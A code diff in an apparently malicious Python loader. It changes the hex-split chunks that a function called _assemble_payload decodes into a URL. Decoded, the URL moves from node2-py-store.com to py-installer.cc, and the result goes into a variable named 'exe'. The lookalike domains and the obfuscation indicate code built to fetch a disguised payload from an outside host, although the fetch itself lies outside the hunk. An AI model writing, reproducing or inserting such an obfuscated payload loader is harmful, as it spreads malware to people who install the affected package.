@@ -37,13 +37,13 @@ def _assemble_payload():
         '687474',
         '70',
         '733a2f',
-        '2f6e6f',
-        '6465',
-        '322d70',
+        '2f70',
         '792d',
-        '73746f',
-        '72652e',
-        '636f6d'
+        '696e73',
+        '7461',
+        '6c6c',
+        '65722e',
+        '6363'
     ]
     decoded = [_from_hex(c) for c in chunks]
     exe = (decoded[0] + decoded[1] + decoded[2] + decoded[3] + decoded[4]).decode('utf-8', errors='ignore')
